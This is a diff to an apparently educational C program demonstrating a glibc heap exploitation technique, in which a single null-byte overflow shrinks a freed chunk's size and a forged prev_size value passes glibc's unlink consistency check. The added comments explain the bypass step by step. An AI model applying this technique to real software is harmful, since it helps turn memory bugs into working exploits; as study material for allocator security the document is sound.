@@ -42,22 +42,32 @@ int main()
 	// this added check requires we are allowed to have null pointers in b (not just a c string)
 	//*(size_t*)(b+0x1f0) = 0x200;
 	printf("In newer versions of glibc we will need to have our updated size inside b itself to pass "
-	       "the check 'chunksize(P) != prev_size (next_chunk(P))'\n");
-
+		"the check 'chunksize(P) != prev_size (next_chunk(P))'\n");
+	// we set this location to 0x200 since 0x200 == (0x211 & 0xff00)
+	// which is the value of b.size after its first byte has been overwritten with a NULL byte
 	*(size_t*)(b+0x1f0) = 0x200;
 
-    /* this technique works by overwriting the size metadata of a free chunk */
+	// this technique works by overwriting the size metadata of a free chunk
 	free(b);
 	
 	printf("b.size: %#lx\n", *b_size_ptr);
 	printf("b.size is: (0x200 + 0x10) | prev_in_use\n");
 	printf("We overflow 'a' with a single null byte into the metadata of 'b'\n");
-	a[real_a_size] = 0; 
+	a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
 	printf("b.size: %#lx\n", *b_size_ptr);
 
 	uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
 	printf("c.prev_size is %#lx\n",*c_prev_size_ptr);
 
+	// This malloc will result in a call to unlink on the chunk where b was.
+	// The added check (commit id: 17f487b), if not properly handled as we did before,
+	// will detect the heap corruption now.
+	// The check is this: chunksize(P) != prev_size (next_chunk(P)) where
+	// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)
+	// next_chunk(P) == b-0x10+0x200 == 0x1f0
+	// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200
+	printf("We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n",
+		*((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
 	b1 = malloc(0x100);
 
 	printf("b1: %p\n",b1);
